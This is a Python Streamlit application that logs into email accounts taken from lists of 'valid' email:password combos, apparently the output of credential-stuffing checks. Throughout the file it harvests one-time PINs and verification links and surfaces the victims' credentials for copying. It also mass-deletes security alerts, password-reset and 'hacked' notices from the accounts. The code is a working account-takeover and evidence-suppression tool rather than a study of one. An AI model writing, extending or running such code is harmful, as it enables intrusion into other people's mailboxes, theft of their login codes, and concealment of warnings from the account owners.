import streamlit as st
import imaplib
import glob
import os
import re
import base64
import math
import time
from typing import List, Tuple
from email.header import decode_header
from email import message_from_bytes
from hosts import host_list

# Page Configuration & Keep-Alive Injector
st.set_page_config(
    page_title="Bobito Mailbox Reader & Portal Hub",
    page_icon="📥",
    layout="wide",
    initial_sidebar_state="expanded"
)

st.markdown(
    """
    <script>
    setInterval(function(){
        fetch('/_stcore/health').then(res => {});
    }, 30000);
    </script>
    """,
    unsafe_allow_html=True
)

# Initialize Session State
if "mb_log" not in st.session_state:
    st.session_state.mb_log = []
if "mb_folders" not in st.session_state:
    st.session_state.mb_folders = ["INBOX"]
if "folder_map" not in st.session_state:
    st.session_state.folder_map = {"INBOX": "INBOX"}
if "mb_host" not in st.session_state:
    st.session_state.mb_host = ""
if "current_page" not in st.session_state:
    st.session_state.current_page = 1
if "folder_debug_logs" not in st.session_state:
    st.session_state.folder_debug_logs = []
if "bot_diag_logs" not in st.session_state:
    st.session_state.bot_diag_logs = []
if "search_diag_logs" not in st.session_state:
    st.session_state.search_diag_logs = []
if "current_messages" not in st.session_state:
    st.session_state.current_messages = []
if "total_matched_count" not in st.session_state:
    st.session_state.total_matched_count = 0
if "bot_filter_mode" not in st.session_state:
    st.session_state.bot_filter_mode = False


def log(msg):
    st.session_state.mb_log.insert(0, msg)
    st.session_state.mb_log = st.session_state.mb_log[:50]


def debug_log(msg):
    st.session_state.folder_debug_logs.append(msg)


def bot_log(msg):
    st.session_state.bot_diag_logs.append(msg)


def search_log(msg):
    st.session_state.search_diag_logs.append(msg)


def load_valid():
    rows, seen = [], set()
    paths = sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
    paths += [p for p in ("clean_valid_accounts.txt", "valid_accounts.txt") if os.path.exists(p)]
    for path in paths:
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if ":" not in line:
                        continue
                    email_val, pwd = line.split(":", 1)
                    combo = f"{email_val.strip()}:{pwd.split('|')[0].strip()}"
                    if combo not in seen:
                        seen.add(combo)
                        rows.append(combo)
        except Exception:
            continue
    return rows


def decode_hdr(value):
    try:
        out = []
        for part, enc in decode_header(value or ""):
            out.append(part.decode(enc or "utf-8", errors="ignore") if isinstance(part, bytes) else str(part))
        return "".join(out)
    except Exception:
        return str(value or "")


def get_webmail_portal(email_addr):
    if "@" not in email_addr:
        return "https://mail.google.com"
    domain = email_addr.split("@")[-1].lower()
    portals = {
        "gmail.com": "https://mail.google.com",
        "googlemail.com": "https://mail.google.com",
        "outlook.com": "https://outlook.live.com",
        "hotmail.com": "https://outlook.live.com",
        "live.com": "https://outlook.live.com",
        "yahoo.com": "https://mail.yahoo.com",
        "ymail.com": "https://mail.yahoo.com",
        "icloud.com": "https://www.icloud.com/mail",
        "me.com": "https://www.icloud.com/mail",
        "aol.com": "https://mail.aol.com",
        "zoho.com": "https://mail.zoho.com",
        "proton.me": "https://mail.proton.me",
        "protonmail.com": "https://mail.proton.me"
    }
    return portals.get(domain, f"https://www.{domain}")


def decode_imap_utf7(s: str) -> str:
    if "&" not in s:
        return s
    res = []
    for part in s.split("&"):
        if "-" in part and not part.startswith("-"):
            b64_str, rest = part.split("-", 1)
            if b64_str == "":
                res.append("&" + rest)
            else:
                try:
                    b64_padded = b64_str.replace(",", "/") + "=" * ((4 - len(b64_str) % 4) % 4)
                    decoded = base64.b64decode(b64_padded).decode("utf-16be")
                    res.append(decoded + rest)
                except Exception:
                    res.append("&" + part)
        else:
            res.append(part)
    return "".join(res)


def clean_display_label(folder_name: str) -> str:
    upper_name = folder_name.upper()
    if upper_name == "INBOX":
        return "INBOX"
    if upper_name.startswith("INBOX.") or upper_name.startswith("INBOX/"):
        return folder_name[6:]
    return folder_name


def parse_imap_list_line(s: str) -> Tuple[str, str, str]:
    s = s.strip()
    flags, delim, raw_name = "", '"."', s
    if s.startswith("("):
        end_paren = s.find(")")
        if end_paren != -1:
            flags = s[1:end_paren].strip()
            remainder = s[end_paren + 1:].strip()
            parts = remainder.split(None, 1)
            if len(parts) >= 1:
                delim = parts[0]
            raw_name = parts[1].strip() if len(parts) == 2 else ""

    if raw_name.startswith('"') and raw_name.endswith('"') and len(raw_name) >= 2:
        raw_name = raw_name[1:-1].replace('\\"', '"')

    return flags, delim, raw_name


def get_imap_path(selected_ui_folder: str) -> str:
    folder_map = st.session_state.get("folder_map", {})
    return folder_map.get(selected_ui_folder, selected_ui_folder)


def list_folders(mail, email_addr: str = "", host_val: str = ""):
    found = set()
    st.session_state.folder_debug_logs = []
    debug_log(f"📧 [TARGET ACCOUNT] Email: '{email_addr}' | Host: '{host_val}'")
    debug_log("🔍 [ENGINE START] Issuing IMAP command: LIST '' '*'")

    try:
        typ, data = mail.list('""', "*")
        debug_log(f"📡 [RESPONSE STATUS] Server Response Code: '{typ}' | Raw Records Count: {len(data) if data else 0}")
        if typ == "OK" and data:
            for idx, item in enumerate(data, 1):
                if not item:
                    continue
                try:
                    s = item.decode("latin1", errors="ignore") if isinstance(item, bytes) else str(item)
                    s = s.strip()
                    debug_log(f"\n  ├─ [Line #{idx} Raw]: {s}")
                    flags, delim, clean_name = parse_imap_list_line(s)
                    flags_lower = flags.lower()

                    if r"\noselect" in flags_lower or r"\nonexistent" in flags_lower:
                        debug_log("  │   └─ ⚠️ FILTERED OUT: Flagged as \\Noselect or \\Nonexistent")
                        continue

                    if clean_name and clean_name not in (".", "/", '""', "''"):
                        decoded_folder = decode_imap_utf7(clean_name)
                        ui_label = clean_display_label(decoded_folder)
                        found.add(decoded_folder)
                        debug_log(f"  │   └─ ✅ ACCEPTED FOLDER: Raw='{decoded_folder}' -> UI='{ui_label}'")
                except Exception as line_ex:
                    debug_log(f"  │   └─ ⚠️ PARSE ERROR: {line_ex}")
                    continue
    except Exception as ex:
        debug_log(f"❌ [EXCEPTION ERROR] Folder enumeration failed: {ex}")

    if not found:
        found.add("INBOX")

    sorted_raw = sorted(list(found), key=lambda x: (0 if x.lower() == "inbox" else 1, clean_display_label(x).lower()))
    folder_map, display_folders = {}, []
    for raw_f in sorted_raw:
        label = clean_display_label(raw_f)
        folder_map[label] = raw_f
        display_folders.append(label)

    st.session_state.folder_map = folder_map
    return display_folders


def open_mail(email_addr, password_val, host_val):
    mail = imaplib.IMAP4_SSL(host_val, 993, timeout=20)
    mail.login(email_addr, password_val)
    return mail


def close_mail(mail):
    try:
        mail.logout()
    except Exception:
        try:
            mail.shutdown()
        except Exception:
            pass


def is_bot_message(subject, body, frm=""):
    bot_keywords = [
        "otp", "verification", "verify", "security alert", "password reset",
        "code", "confirm", "login", "auth", "signin", "crypto", "token", "activation",
        "hacked", "extortion", "wallet", "staking", "mcafee", "iptv", "lot"
    ]
    combined = f"{subject} {body} {frm}".lower()
    return any(kw in combined for kw in bot_keywords)


def extract_pins_and_links(text):
    pins = re.findall(r'\b(?<![#\d])\d{4,8}(?![#\d])\b', text)
    urls = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', text)
    cleaned_urls = [u for u in urls if not any(x in u.lower() for x in ["w3.org", "schema.org", "apple.com/DTDs"])]
    return list(dict.fromkeys(pins)), list(dict.fromkeys(cleaned_urls))


def clean_boilerplate(text):
    if not text:
        return ""
    patterns = [
        (r"unsubscribe.*?(?:\n|$)", re.IGNORECASE),
        (r"privacy policy.*?(?:\n|$)", re.IGNORECASE),
        (r"confidentiality notice.*?(?:\n\n|$)", re.IGNORECASE),
        (r"this email was sent by.*?(?:\n|$)", re.IGNORECASE)
    ]
    cleaned = text
    for pat, flags in patterns:
        cleaned = re.sub(pat, "", cleaned, flags=flags)
    return cleaned.strip()


def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_folders: List[str], 
                            search_query: str = "", search_field: str = "TEXT", mode: str = "SEARCH", 
                            page_size: int = 15, page_number: int = 1, sort_order: str = "Newest First"):
    st.session_state.search_diag_logs = []
    messages = []
    start_time = time.time()
    
    search_log(f"⚙️ [ENGINE INIT] Mode: '{mode}' | Target Folders ({len(target_folders)}): {target_folders}")
    search_log(f"🔎 [SEARCH SPECS] Query: '{search_query}' | Search Field: '{search_field}' | Page: {page_number} | Page Size: {page_size}")

    total_matched_all_folders = 0

    for f_label in target_folders:
        real_imap_folder = get_imap_path(f_label)
        search_log(f"\n📂 [PROCESSING FOLDER] Label='{f_label}' -> IMAP Path='{real_imap_folder}'")
        
        try:
            sel_typ, sel_data = mail.select(f'"{real_imap_folder}"', readonly=True)
            search_log(f"  ├─ [IMAP SELECT] Status: '{sel_typ}' | Response: {sel_data}")
            
            if sel_typ != "OK":
                search_log(f"  └─ ⚠️ Skipped folder '{f_label}': Failed to select IMAP path.")
                continue

            # Execute Search or All Load based on mode
            if mode == "FOLDER_ONLY" or not search_query.strip():
                cmd = "SEARCH ALL"
                search_log(f"  ├─ [EXECUTING COMMAND] {cmd}")
                typ, data = mail.search(None, "ALL")
            else:
                field_cmd = search_field if search_field in ("TEXT", "SUBJECT", "FROM", "BODY") else "TEXT"
                cmd = f'SEARCH {field_cmd} "{search_query.strip()}"'
                search_log(f"  ├─ [EXECUTING COMMAND] {cmd}")
                typ, data = mail.search(None, field_cmd, f'"{search_query.strip()}"')

            search_log(f"  ├─ [IMAP SEARCH RESPONSE] Status: '{typ}' | Raw Bytes: {data}")
            ids = (data[0] or b"").split() if typ == "OK" else []
            total_matched_all_folders += len(ids)
            search_log(f"  ├─ [MATCHES COUNT] Found {len(ids)} message IDs in '{f_label}'.")

            # Slice Message IDs before fetching to eliminate parsing lag
            if sort_order == "Newest First":
                ids = list(reversed(ids))

            start_idx = (page_number - 1) * page_size
            end_idx = start_idx + page_size
            target_ids = ids[start_idx:end_idx]

            search_log(f"  ├─ [PAGINATION RANGE] Total IDs: {len(ids)} | Fetching range index [{start_idx}:{end_idx}] -> {len(target_ids)} target IDs")

            for idx, mid in enumerate(target_ids, 1):
                msg_start = time.time()
                
                typ, msgdata = mail.fetch(mid, "(FLAGS ENVELOPE BODYSTRUCTURE BODY.PEEK[])")
                
                if not msgdata or not isinstance(msgdata[0], tuple):
                    search_log(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ FETCH returned empty structure.")
                    continue

                raw_msg_bytes = msgdata[0][1]
                msg = message_from_bytes(raw_msg_bytes)
                subject = decode_hdr(msg.get("Subject", ""))
                frm = decode_hdr(msg.get("From", ""))
                to_hdr = decode_hdr(msg.get("To", ""))
                date_val = decode_hdr(msg.get("Date", ""))
                flags_str = str(msgdata[0][0])
                is_read = "\\Seen" in flags_str

                body_text = ""
                if msg.is_multipart():
                    for part in msg.walk():
                        if part.get_content_type() == "text/plain":
                            try:
                                body_text = part.get_payload(decode=True).decode("utf-8", errors="ignore")
                                break
                            except Exception:
                                pass
                else:
                    try:
                        body_text = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
                    except Exception:
                        pass

                cleaned_body = clean_boilerplate(body_text)
                pins, links = extract_pins_and_links(body_text)
                is_bot = is_bot_message(subject, body_text, frm)

                messages.append({
                    "id": mid.decode(),
                    "folder": f_label,
                    "from": frm,
                    "to": to_hdr,
                    "subject": subject,
                    "date": date_val,
                    "is_read": is_read,
                    "is_bot": is_bot,
                    "body": cleaned_body,
                    "pins": pins,
                    "links": links,
                    "raw": raw_msg_bytes,
                    "flags": flags_str,
                    "size_bytes": len(raw_msg_bytes)
                })
                
                fetch_elapsed = round((time.time() - msg_start) * 1000, 2)
                search_log(
                    f"  │   ├─ [Msg #{idx} | ID: {mid.decode()}] Parsed in {fetch_elapsed}ms | Size: {len(raw_msg_bytes)}B | "
                    f"From: '{frm}' | To: '{to_hdr}' | Subject: '{subject}' | "
                    f"Flags: {flags_str} | BotDetected={is_bot}"
                )

        except Exception as ex:
            search_log(f"  └─ ❌ [EXCEPTION ERROR] Querying folder '{f_label}' failed: {ex}")

    total_elapsed = round(time.time() - start_time, 2)
    st.session_state.total_matched_count = total_matched_all_folders
    search_log(f"\n🏁 [ENGINE COMPLETE] Total retrieved page messages: {len(messages)} / {total_matched_all_folders} matched | Execution time: {total_elapsed}s")
    return messages


# Header
st.title("📥 Bobito Mailbox Reader & Portal Hub")
st.caption("Advanced IMAP Client with Interactive Bot Intelligence, Multi-Field Search, and Deep Diagnostic Instrumentation.")

valid = load_valid()

# Sidebar Hub
st.sidebar.header("Account & Connection Hub")
pick = st.sidebar.selectbox("Valid account", valid or ["none"])
custom_email = st.sidebar.text_input("Email override")
custom_pass = st.sidebar.text_input("Password override", type="password")
override = st.sidebar.text_input("IMAP host override")

if custom_email.strip():
    email, password = custom_email.strip(), custom_pass.strip()
elif ":" in pick:
    email, password = pick.split(":", 1)
else:
    email, password = "", ""

# Quick Refresh Inbox Control
if st.sidebar.button("🔄 Refresh Inbox", type="secondary", use_container_width=True):
    if email and password:
        host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
        mail_obj = None
        try:
            with st.spinner("Refreshing Inbox..."):
                mail_obj = open_mail(email, password, host)
                st.session_state.current_messages = fetch_messages_paginated(
                    mail_obj, email, password, host, ["INBOX"], mode="FOLDER_ONLY", 
                    page_size=15, page_number=1, sort_order="Newest First"
                )
                close_mail(mail_obj)
                st.session_state.current_page = 1
                st.session_state.bot_filter_mode = False
                st.sidebar.success("Inbox refreshed successfully!")
        except Exception as e:
            st.sidebar.error(f"Refresh failed: {e}")
            if mail_obj:
                close_mail(mail_obj)

# Webmail Portal & Credentials Output
if email and password:
    st.sidebar.markdown("---")
    st.sidebar.subheader("🌐 Webmail Portal & Credentials")
    portal_url = get_webmail_portal(email)
    st.sidebar.markdown(f"[Open Webmail Portal]({portal_url})", unsafe_allow_html=True)
    st.sidebar.text_input("Copy Credentials", value=f"{email}:{password}")

if st.sidebar.button("Connect & Discover Folders", type="primary", use_container_width=True):
    if not email or not password:
        st.error("Need email and password")
    else:
        hosts = [override.strip()] if override.strip() else host_list(email)
        last, connected_host, folders, success = "no host", "", ["INBOX"], False

        with st.spinner("Connecting and discovering folders..."):
            for host in hosts:
                mail_obj = None
                try:
                    mail_obj = open_mail(email, password, host)
                    folders = list_folders(mail_obj, email_addr=email, host_val=host)
                    close_mail(mail_obj)
                    connected_host = host
                    success = True
                    break
                except Exception as e:
                    last = f"{host}: {e}"
                    if mail_obj:
                        close_mail(mail_obj)

        if success:
            st.session_state.mb_host = connected_host
            st.session_state.mb_folders = folders
            log(f"Discovered {len(folders)} folders via {connected_host}")
            st.sidebar.success(f"Connected: {connected_host} ({len(folders)} folders)")
        else:
            st.sidebar.error(last)

# Debug Expander for Discovery
if st.session_state.folder_debug_logs:
    with st.expander("🛠️ Folder Discovery Diagnostic Traces", expanded=False):
        st.code("\n".join(st.session_state.folder_debug_logs), language="text")

# Controls Layout
col1, col2, col3 = st.columns([2, 1, 1])
with col1:
    folder = st.selectbox("Select Mail Folder", st.session_state.mb_folders)
with col2:
    page_size = st.slider("Page size", 5, 50, 15)
with col3:
    sort_order = st.selectbox("Sort Order", ["Newest First", "Oldest First"])

# Direct Folder Load Trigger
if st.button("📂 Load Folder Messages", type="primary", use_container_width=True):
    host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
    if not email or not password or not host:
        st.error("Please connect and load folders first.")
    else:
        mail = None
        try:
            with st.spinner(f"Loading folder '{folder}'..."):
                mail = open_mail(email, password, host)
                msgs = fetch_messages_paginated(
                    mail, email, password, host, [folder], mode="FOLDER_ONLY",
                    page_size=page_size, page_number=1, sort_order=sort_order
                )
                st.session_state.current_messages = msgs
                st.session_state.current_page = 1
                st.session_state.bot_filter_mode = False
                log(f"Loaded {len(msgs)} messages from folder '{folder}'.")
        except Exception as e:
            st.error(str(e))
        finally:
            if mail:
                close_mail(mail)

# Deep Search and Scope Filters Block
with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=True):
    s_col1, s_col2 = st.columns([1, 1])
    with s_col1:
        search_scope = st.selectbox("Search Scope", ["Current Folder", "ALL_FOLDERS"])
    with s_col2:
        search_field = st.selectbox("Search Field Option", ["TEXT", "SUBJECT", "FROM", "BODY"])
    
    search_query = st.text_input("Search term or keyword")
    
    if st.button("🔍 Execute Keyword Search", use_container_width=True):
        host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
        if not email or not password or not host:
            st.error("Please connect and load folders first.")
        else:
            mail = None
            try:
                target_scope = st.session_state.mb_folders if search_scope == "ALL_FOLDERS" else [folder]
                with st.spinner(f"Scanning target mailboxes ({len(target_scope)} folder/s) for [{search_field}: '{search_query}']..."):
                    mail = open_mail(email, password, host)
                    msgs = fetch_messages_paginated(
                        mail, email, password, host, target_scope, search_query, search_field, mode="SEARCH",
                        page_size=page_size, page_number=1, sort_order=sort_order
                    )
                    st.session_state.current_messages = msgs
                    st.session_state.current_page = 1
                    st.session_state.bot_filter_mode = False
                    log(f"Search found {st.session_state.total_matched_count} total matches across target scope.")
            except Exception as e:
                st.error(str(e))
            finally:
                if mail:
                    close_mail(mail)

# Diagnostic Logs Expander
if st.session_state.search_diag_logs:
    with st.expander("🛠️ Screen Log & Deep Diagnostic Traces", expanded=True):
        st.code("\n".join(st.session_state.search_diag_logs), language="text")

# -----------------------------------------------------------------------------
# SEPARATE DEDICATED MASS BOT DELETE & DIAGNOSTIC SECTION
# -----------------------------------------------------------------------------
st.markdown("---")
with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=True):
    all_loaded_bot_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
    
    bot_col1, bot_col2 = st.columns([2, 1])
    with bot_col1:
        bot_target_folder = st.selectbox(
            "Select Bot Target Scope", 
            ["ALL_FOLDERS"] + st.session_state.mb_folders, 
            key="bot_hub_folder_select"
        )
    with bot_col2:
        bot_scan_limit = st.selectbox("Bot Scan Depth", [50, 100, 200, 500], index=1)

    b_act1, b_act2 = st.columns(2)
    with b_act1:
        if st.button("🔍 Scan Folder For Bot/OTP Messages", use_container_width=True):
            host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
            if not email or not password or not host:
                st.error("Please connect first.")
            else:
                mail = None
                try:
                    target_scope = st.session_state.mb_folders if bot_target_folder == "ALL_FOLDERS" else [bot_target_folder]
                    with st.spinner("Scanning target folders for bot intelligence..."):
                        mail = open_mail(email, password, host)
                        msgs = fetch_messages_paginated(
                            mail, email, password, host, target_scope, mode="FOLDER_ONLY",
                            page_size=bot_scan_limit, page_number=1, sort_order="Newest First"
                        )
                        st.session_state.current_messages = msgs
                        st.session_state.bot_filter_mode = True
                        st.success(f"Scan complete. Displaying detected bot messages.")
                except Exception as ex:
                    st.error(str(ex))
                finally:
                    if mail:
                        close_mail(mail)

    with b_act2:
        if st.button("🚨 Mass Delete All Detected Bot Messages", type="primary", use_container_width=True):
            if not all_loaded_bot_msgs:
                st.warning("No bot messages detected in current loaded stream to delete.")
            else:
                st.session_state.bot_diag_logs = []
                host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                mail = None
                try:
                    bot_log("🤖 [BOT ENGINE DIAGNOSTIC START] Initializing Mass Deletion Sequence...")
                    bot_log(f"📋 Targets Count: {len(all_loaded_bot_msgs)} detected bot messages")
                    mail = open_mail(email, password, host)
                    deleted_count = 0
                    
                    for idx, bm in enumerate(all_loaded_bot_msgs, 1):
                        r_folder = get_imap_path(bm["folder"])
                        bot_log(f"  ├─ [Msg #{idx}] ID={bm['id']} | Folder='{bm['folder']}' ({r_folder}) | From='{bm['from']}' | Subject='{bm['subject']}'")
                        sel_code, sel_res = mail.select(f'"{r_folder}"', readonly=False)
                        bot_log(f"  │   ├─ IMAP SELECT: Status={sel_code} | Res={sel_res}")
                        
                        st_code, st_res = mail.store(bm["id"], '+FLAGS', '\\Deleted')
                        bot_log(f"  │   ├─ STORE FLAGS: Status={st_code} | Res={st_res}")
                        
                        exp_code, exp_res = mail.expunge()
                        bot_log(f"  │   ├─ EXPUNGE: Status={exp_code} | Res={exp_res}")
                        
                        deleted_count += 1
                        bot_log(f"  │   └─ ✅ EXPOSED & PURGED from IMAP target")

                    bot_log(f"\n🏁 [MASS DELETE COMPLETE] Successfully purged {deleted_count} bot messages from server.")
                    st.success(f"Successfully deleted {deleted_count} bot messages!")
                    
                    # Refresh local state
                    st.session_state.current_messages = [m for m in st.session_state.current_messages if not m["is_bot"]]
                    st.session_state.bot_filter_mode = False
                    st.rerun()
                except Exception as e:
                    bot_log(f"❌ [MASS DELETE EXCEPTION]: {e}")
                    st.error(f"Error during mass delete: {e}")
                finally:
                    if mail:
                        close_mail(mail)

    # Bot Messages Dedicated Preview Screen
    st.markdown("#### 📱 Detected Bot Message Preview Screen")
    if all_loaded_bot_msgs:
        for idx, bm in enumerate(all_loaded_bot_msgs, 1):
            st.markdown(f"**[{idx}] [{bm['folder']}]** `{bm['from']}` — **{bm['subject']}** (ID: `{bm['id']}`) ")
            if bm["pins"]:
                st.info(f"🔑 PINs detected: {', '.join(bm['pins'])}")
    else:
        st.caption("No bot messages currently loaded in session memory.")

    # Dedicated Bot Diagnostic & Log Screen
    st.markdown("#### 🛠️ Mass Bot Delete Diagnostic & Diagnose Log Screen")
    if st.session_state.bot_diag_logs:
        st.code("\n".join(st.session_state.bot_diag_logs), language="text")
    else:
        st.caption("Bot engine traces will be printed here during purge operations.")

# -----------------------------------------------------------------------------
# MAIN MESSAGE STREAM
# -----------------------------------------------------------------------------
if st.session_state.bot_filter_mode:
    active_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
    st.info("⚠️ Message stream is currently filtered to show DETECTED BOT/SPAM MESSAGES ONLY.")
else:
    active_msgs = st.session_state.current_messages

total_msgs = st.session_state.total_matched_count or len(active_msgs)

if len(active_msgs) > 0:
    st.markdown("---")
    
    # Calculate Pagination Parameters
    total_pages = max(1, math.ceil(total_msgs / page_size))
    curr_p = st.session_state.current_page
    
    # Display Indicator Header
    st.markdown("### ✉️ Message Stream")
    st.markdown(f"**Showing Page {curr_p} of {total_pages} (Total Server Matches: {total_msgs})**")

    # Render Messages Page
    for idx, msg in enumerate(active_msgs):
        status_icon = "📖" if msg["is_read"] else "📩"
        bot_badge = " [🤖 BOT/OTP/SPAM]" if msg["is_bot"] else ""
        folder_badge = f" [{msg['folder']}]"

        with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{bot_badge}"):
            st.write(f"**Folder:** {msg['folder']}")
            st.write(f"**From:** {msg['from']}")
            st.write(f"**To:** {msg['to']}")
            st.write(f"**Subject:** {msg['subject']}")
            st.write(f"**Date:** {msg['date']}")
            st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

            if msg["pins"]:
                st.success(f"🔑 **Extracted PINs / Verification Codes:** {', '.join(msg['pins'])}")
            if msg["links"]:
                st.markdown("🔗 **Actionable Verification Links:**")
                for link in msg["links"]:
                    st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

            st.markdown("---")
            st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"body_{msg['folder']}_{msg['id']}_{idx}")

            # Per-Message Interactive Operations
            op_col1, op_col2, op_col3, op_col4 = st.columns(4)
            host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
            real_imap_folder = get_imap_path(msg['folder'])

            with op_col1:
                if not msg["is_read"]:
                    if st.button("Mark as Read", key=f"read_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            m_client = open_mail(email, password, host)
                            m_client.select(f'"{real_imap_folder}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Seen')
                            close_mail(m_client)
                            msg["is_read"] = True
                            st.success("Marked as read!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

            with op_col2:
                target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                if st.button("Move Message", key=f"mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                    try:
                        real_target_path = get_imap_path(target_move)
                        m_client = open_mail(email, password, host)
                        m_client.select(f'"{real_imap_folder}"', readonly=False)
                        m_client.copy(msg["id"], f'"{real_target_path}"')
                        m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                        m_client.expunge()
                        close_mail(m_client)
                        st.session_state.current_messages.remove(msg)
                        st.success(f"Moved to {target_move}!")
                        st.rerun()
                    except Exception as ex:
                        st.error(str(ex))

            with op_col3:
                del_label = "Delete Bot Msg" if msg["is_bot"] else "Delete Message"
                if st.button(del_label, key=f"del_{msg['folder']}_{msg['id']}_{idx}", type="primary" if msg["is_bot"] else "secondary"):
                    try:
                        m_client = open_mail(email, password, host)
                        m_client.select(f'"{real_imap_folder}"', readonly=False)
                        m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                        m_client.expunge()
                        close_mail(m_client)
                        st.session_state.current_messages.remove(msg)
                        st.success("Deleted message!")
                        st.rerun()
                    except Exception as ex:
                        st.error(str(ex))

            with op_col4:
                with st.popover("View Raw RFC822"):
                    st.code(msg["raw"].decode("utf-8", errors="ignore"))

    # Pagination Controls Bar
    st.markdown("---")
    p_col1, p_col2, p_col3 = st.columns([1, 2, 1])

    with p_col1:
        if st.button("Previous Page", disabled=(curr_p <= 1), use_container_width=True):
            st.session_state.current_page -= 1
            host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
            mail = open_mail(email, password, host)
            target_scope = st.session_state.mb_folders if search_scope == "ALL_FOLDERS" else [folder]
            st.session_state.current_messages = fetch_messages_paginated(
                mail, email, password, host, target_scope, search_query, search_field, 
                mode="SEARCH" if search_query else "FOLDER_ONLY",
                page_size=page_size, page_number=st.session_state.current_page, sort_order=sort_order
            )
            close_mail(mail)
            st.rerun()

    with p_col2:
        st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {curr_p} of {total_pages}</h4>", unsafe_allow_html=True)

    with p_col3:
        if st.button("Next Page", disabled=(curr_p >= total_pages), use_container_width=True):
            st.session_state.current_page += 1
            host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
            mail = open_mail(email, password, host)
            target_scope = st.session_state.mb_folders if search_scope == "ALL_FOLDERS" else [folder]
            st.session_state.current_messages = fetch_messages_paginated(
                mail, email, password, host, target_scope, search_query, search_field, 
                mode="SEARCH" if search_query else "FOLDER_ONLY",
                page_size=page_size, page_number=st.session_state.current_page, sort_order=sort_order
            )
            close_mail(mail)
            st.rerun()
